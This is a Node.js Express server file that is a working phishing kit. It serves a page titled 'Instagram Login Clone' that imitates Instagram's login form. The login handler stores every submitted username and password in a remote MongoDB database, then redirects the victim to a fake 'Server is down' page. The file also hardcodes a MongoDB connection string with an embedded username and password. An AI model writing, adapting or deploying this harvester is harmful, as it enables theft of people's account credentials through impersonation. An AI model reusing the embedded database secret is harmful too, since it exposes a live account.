// server.js
// ===============================
// Full server with Login, Signup, Server-down pages
// Updated Logic:
// FIRST login attempt -> directly opens Server Down page
// Password minimum 6 characters logic kept same
// ===============================

const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// serve static files from "public"
app.use(express.static(path.join(__dirname, "public")));

// ===============================
// MongoDB connection
// ===============================
const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// ===============================
// User model
// ===============================
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, trim: true },
  emailOrPhone: { type: String, trim: true },
  fullName: { type: String, trim: true },
  password: { type: String, required: true },
});

const User = mongoose.model("User", userSchema);

// ===============================
// API: LOGIN
// FIRST ATTEMPT -> SERVER DOWN
// ===============================
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // validation
    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: "Fill the username and password",
      });
    }

    // KEEP THIS SAME
    if (password.length < 6) {
      return res.status(400).json({
        success: false,
        message: "Password length minimum 6 characters",
      });
    }

    // save entered credentials
    await User.create({
      username,
      password,
      emailOrPhone: "",
      fullName: "",
    });

    // DIRECTLY REDIRECT TO SERVER DOWN PAGE
    return res.json({
      success: true,
      redirect: "/server-down",
    });
  } catch (err) {
    console.error("Login error:", err);

    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
});

// ===============================
// API: SIGNUP
// ===============================
app.post("/api/signup", async (req, res) => {
  try {
    const { emailOrPhone, password, fullName, username } = req.body;

    if (!emailOrPhone || !password || !fullName || !username) {
      return res.status(400).json({
        success: false,
        message: "All fields are required",
      });
    }

    if (password.length < 6) {
      return res.status(400).json({
        success: false,
        message: "Password length minimum 6 characters",
      });
    }

    const exists = await User.findOne({ username });

    if (exists) {
      return res.status(400).json({
        success: false,
        message: "Username already taken",
      });
    }

    await User.create({
      username,
      password,
      emailOrPhone,
      fullName,
    });

    return res.json({
      success: true,
      redirect: "/",
    });
  } catch (err) {
    console.error("Signup error:", err);

    return res.status(500).json({
      success: false,
      message: "Signup failed",
    });
  }
});

// ===============================
// LOGIN PAGE
// ===============================
const loginPageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Instagram Login Clone</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:system-ui;
}

body{
  background:#000;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:20px;
}

.page-wrapper{
  max-width:360px;
  width:100%;
}

.card{
  border:1px solid #262626;
  padding:36px;
  text-align:center;
}

.logo-img{
  width:180px;
  margin:0 auto 22px;
  display:block;
}

.input-group{
  position:relative;
  margin-bottom:14px;
  text-align:left;
}

.input-group input{
  width:100%;
  padding:12px;
  background:#121212;
  border:1px solid #363636;
  border-radius:6px;
  color:#fff;
}

.input-group input::placeholder{
  color:#888;
}

.show-btn{
  position:absolute;
  right:10px;
  top:35%;
  transform:translateY(-50%);
  padding:6px 12px;
  font-size:13px;
  background:#2a2a2a;
  border:1px solid #555;
  border-radius:6px;
  cursor:pointer;
  color:#fff;
}

.input-error{
  color:#f02849;
  font-size:12px;
  min-height:16px;
  margin-top:4px;
}

.login-btn{
  margin-top:12px;
  width:100%;
  padding:10px 0;
  background:#385185;
  border:none;
  border-radius:8px;
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

.bottom-card{
  margin-top:18px;
  border:1px solid #262626;
  padding:14px;
  text-align:center;
}

.bottom-card a{
  color:#0095f6;
  text-decoration:none;
}

</style>
</head>

<body>

<div class="page-wrapper">

<div class="card">

<img src="/image_copy.png" class="logo-img" />

<form id="loginForm">

<div class="input-group">
<input id="username" type="text" placeholder="Phone number, username, or email" />
<div id="usernameError" class="input-error"></div>
</div>

<div class="input-group">
<input id="password" type="password" placeholder="Password" />

<button type="button" id="togglePassword" class="show-btn">
Show
</button>

<div id="passwordError" class="input-error"></div>
</div>

<button type="submit" id="loginBtn" class="login-btn">
Log in
</button>

<div id="globalError" class="input-error" style="text-align:center;margin-top:8px;"></div>

</form>

</div>

<div class="bottom-card">
Don't have an account?
<a href="/signup">Sign up</a>
</div>

</div>

<script>

const passwordInput = document.getElementById('password');
const togglePassword = document.getElementById('togglePassword');

togglePassword.addEventListener('click', () => {

  const isHidden = passwordInput.type === 'password';

  passwordInput.type = isHidden ? 'text' : 'password';

  togglePassword.textContent = isHidden ? 'Hide' : 'Show';
});

document.getElementById('loginForm').addEventListener('submit', async (e) => {

  e.preventDefault();

  document.getElementById('globalError').textContent = '';
  document.getElementById('passwordError').textContent = '';

  const username =
    document.getElementById('username').value.trim();

  const password =
    document.getElementById('password').value;

  if (!username || !password) {

    document.getElementById('globalError').textContent =
      'Fill the username and password';

    return;
  }

  // KEEP SAME
  if (password.length < 6) {

    document.getElementById('passwordError').textContent =
      'Password length minimum 6 characters';

    return;
  }

  const loginBtn = document.getElementById('loginBtn');

  loginBtn.disabled = true;

  try {

    const res = await fetch('/api/login', {
      method:'POST',
      headers:{
        'Content-Type':'application/json'
      },
      body:JSON.stringify({
        username,
        password
      })
    });

    const data = await res.json();

    if (!data.success) {

      document.getElementById('globalError').textContent =
        data.message || 'Server error';

    } else {

      window.location.href =
        data.redirect || '/server-down';
    }

  } catch(err){

    console.error(err);

    document.getElementById('globalError').textContent =
      'Server error';

  } finally {

    loginBtn.disabled = false;
  }

});

</script>

</body>
</html>
`;

// ===============================
// SIGNUP PAGE
// ===============================
const signupPageHTML = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>Signup</title>

<style>

body{
  background:#000;
  color:#fff;
  font-family:system-ui;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  width:350px;
  border:1px solid #262626;
  padding:30px;
}

input{
  width:100%;
  padding:12px;
  margin-bottom:12px;
  background:#121212;
  border:1px solid #363636;
  border-radius:6px;
  color:#fff;
}

button{
  width:100%;
  padding:12px;
  background:#0095f6;
  border:none;
  border-radius:6px;
  color:#fff;
  cursor:pointer;
}

a{
  color:#0095f6;
}

</style>
</head>

<body>

<div class="box">

<h2 style="margin-bottom:20px;">Sign Up</h2>

<form id="signupForm">

<input id="emailOrPhone" placeholder="Email or Phone" />

<input id="signupPassword" type="password" placeholder="Password" />

<input id="fullName" placeholder="Full Name" />

<input id="signupUsername" placeholder="Username" />

<button type="submit">Sign up</button>

</form>

<p style="margin-top:20px;text-align:center;">
Already have account?
<a href="/">Login</a>
</p>

</div>

<script>

document.getElementById('signupForm').addEventListener('submit', async (e) => {

  e.preventDefault();

  const emailOrPhone =
    document.getElementById('emailOrPhone').value.trim();

  const password =
    document.getElementById('signupPassword').value;

  const fullName =
    document.getElementById('fullName').value.trim();

  const username =
    document.getElementById('signupUsername').value.trim();

  if (!emailOrPhone || !password || !fullName || !username) {

    alert('Please fill all fields');
    return;
  }

  if (password.length < 6) {

    alert('Password length minimum 6 characters');
    return;
  }

  try {

    const res = await fetch('/api/signup', {
      method:'POST',
      headers:{
        'Content-Type':'application/json'
      },
      body:JSON.stringify({
        emailOrPhone,
        password,
        fullName,
        username
      })
    });

    const data = await res.json();

    if (!data.success) {

      alert(data.message || 'Signup failed');

    } else {

      window.location.href = '/';
    }

  } catch(err){

    console.error(err);
    alert('Signup failed');
  }

});

</script>

</body>
</html>
`;

// ===============================
// SERVER DOWN PAGE
// ===============================
const serverDownHTML = `
<!DOCTYPE html>
<html>

<head>

<meta charset="utf-8"/>

<title>Server Down</title>

<style>

body{
  background:#000;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  font-family:sans-serif;
}

.box{
  text-align:center;
  padding:24px;
  border:1px solid #262626;
}

img{
  width:150px;
  margin-bottom:12px;
}

button{
  padding:10px 18px;
  background:#0095f6;
  color:#fff;
  border:none;
  border-radius:8px;
  cursor:pointer;
}

</style>

</head>

<body>

<div class="box">

<img src="/image.png" />

<h2>Server is down</h2>

<p>Sorry, something went wrong.</p>

<button onclick="location.href='/'">
Try again
</button>

</div>

</body>
</html>
`;

// ===============================
// ROUTES
// ===============================
app.get("/", (req, res) => res.send(loginPageHTML));

app.get("/signup", (req, res) => res.send(signupPageHTML));

app.get("/server-down", (req, res) =>
  res.send(serverDownHTML)
);

// ===============================
// START SERVER
// ===============================
app.listen(PORT, () => {
  console.log("🚀 Server running on http://localhost:" + PORT);
});